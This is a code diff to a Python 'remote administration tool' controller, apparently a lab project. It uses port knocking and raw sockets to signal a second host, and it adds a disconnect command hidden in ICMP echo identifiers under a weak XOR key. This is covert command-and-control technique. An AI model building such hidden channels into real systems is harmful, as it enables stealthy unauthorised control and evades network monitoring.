@@ -2,7 +2,9 @@
 """hosta: control center for the remote administration tool.
 
 Presents a menu. Option 1 port-knocks hostb and waits for the
-raw-socket ack that confirms the connection.
+raw-socket ack that confirms the connection. Option 2 sends the
+disconnect command via raw ICMP (encrypted in the identifier field,
+sequence number in the sequence field).
 
 Usage:
     sudo python3 hosta.py <hostb_ip>
@@ -19,6 +21,12 @@ SOURCE_PORT = 54321
 TTL = 64
 ACK_TIMEOUT_SECONDS = 5.0
 TCP_ACK_FLAG = 0x10
+
+# Command-channel protocol: command code lives in the ICMP identifier
+# (16 bits, XOR-encrypted with PRE_SHARED_KEY); sequence number lives
+# in the ICMP sequence field in cleartext.
+PRE_SHARED_KEY = 0xA5C3
+CMD_DISCONNECT = 1
 
 MENU_OPTIONS = (
     "Connect to hostb",
@@ -52,7 +60,12 @@ def compute_checksum(data: bytes) -> int:
     return ~running_total & 0xFFFF
 
 
-def build_ip_header(source_ip: str, destination_ip: str, total_length: int) -> bytes:
+def build_ip_header(
+    source_ip: str,
+    destination_ip: str,
+    total_length: int,
+    protocol: int = socket.IPPROTO_TCP,
+) -> bytes:
     def header_with_checksum(checksum_value: int) -> bytes:
         return struct.pack(
             "!BBHHHBBH4s4s",
@@ -62,7 +75,7 @@ def build_ip_header(source_ip: str, destination_ip: str, total_length: int) -> b
             0,                        # identification
             0,                        # flags + fragment offset
             TTL,
-            socket.IPPROTO_TCP,
+            protocol,
             checksum_value,
             socket.inet_aton(source_ip),
             socket.inet_aton(destination_ip),
@@ -155,7 +168,7 @@ def wait_for_connection_ack(
             return True
 
 
-def connect_to_hostb(destination_ip: str) -> None:
+def connect_to_hostb(destination_ip: str) -> bool:
     print("\n=== Connect ===")
     source_ip = detect_source_ip(destination_ip)
     # Open the recv socket first so we don't miss an ack that arrives
@@ -167,14 +180,53 @@ def connect_to_hostb(destination_ip: str) -> None:
         print("sent 3 knock packets, waiting for ack...")
         if wait_for_connection_ack(recv_socket, destination_ip, ACK_TIMEOUT_SECONDS):
             print("connection established")
-        else:
-            print("connection failed: no ack from hostb")
+            return True
+        print("connection failed: no ack from hostb")
+        return False
     finally:
         recv_socket.close()
 
 
-def print_menu() -> None:
-    print("\n--- hosta menu ---")
+def encrypt_identifier(plaintext: int) -> int:
+    return (plaintext ^ PRE_SHARED_KEY) & 0xFFFF
+
+
+def build_icmp_echo_request(identifier_encrypted: int, sequence: int) -> bytes:
+    def header_with_checksum(checksum_value: int) -> bytes:
+        return struct.pack(
+            "!BBHHH",
+            8,                         # type: echo request
+            0,                         # code
+            checksum_value,
+            identifier_encrypted,
+            sequence,
+        )
+    correct_checksum = compute_checksum(header_with_checksum(0))
+    return header_with_checksum(correct_checksum)
+
+
+def send_command(destination_ip: str, command_code: int, sequence: int = 1) -> None:
+    source_ip = detect_source_ip(destination_ip)
+    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    try:
+        identifier = encrypt_identifier(command_code)
+        icmp_header = build_icmp_echo_request(identifier, sequence)
+        ip_header = build_ip_header(
+            source_ip, destination_ip, 20 + len(icmp_header), socket.IPPROTO_ICMP
+        )
+        raw_socket.sendto(ip_header + icmp_header, (destination_ip, 0))
+        print(
+            f"  ICMP -> {destination_ip} "
+            f"id={identifier:#06x} (cmd={command_code}) seq={sequence}"
+        )
+    finally:
+        raw_socket.close()
+
+
+def print_menu(connected: bool) -> None:
+    state_label = "connected" if connected else "disconnected"
+    print(f"\n--- hosta menu --- ({state_label})")
     for index, label in enumerate(MENU_OPTIONS, start=1):
         print(f"  {index}) {label}")
 
@@ -184,9 +236,10 @@ def main() -> int:
         print("Usage: sudo python3 hosta.py <hostb_ip>", file=sys.stderr)
         return 2
     destination_ip = sys.argv[1]
+    connected = False
 
     while True:
-        print_menu()
+        print_menu(connected)
         try:
             choice = input("choice> ").strip()
         except (EOFError, KeyboardInterrupt):
@@ -194,11 +247,25 @@ def main() -> int:
             return 0
 
         if choice == "1":
+            if connected:
+                print("already connected")
+                continue
             try:
-                connect_to_hostb(destination_ip)
+                connected = connect_to_hostb(destination_ip)
             except PermissionError:
                 print("permission denied (raw sockets require sudo)")
-        elif choice in {"2", "3", "4", "5", "6", "7", "8"}:
+        elif choice == "2":
+            if not connected:
+                print("not connected; use option 1 first")
+                continue
+            print("\n=== Disconnect ===")
+            try:
+                send_command(destination_ip, CMD_DISCONNECT)
+                connected = False
+                print("disconnect command sent")
+            except PermissionError:
+                print("permission denied (raw sockets require sudo)")
+        elif choice in {"3", "4", "5", "6", "7", "8"}:
             print("not implemented yet")
         else:
             print("invalid choice")
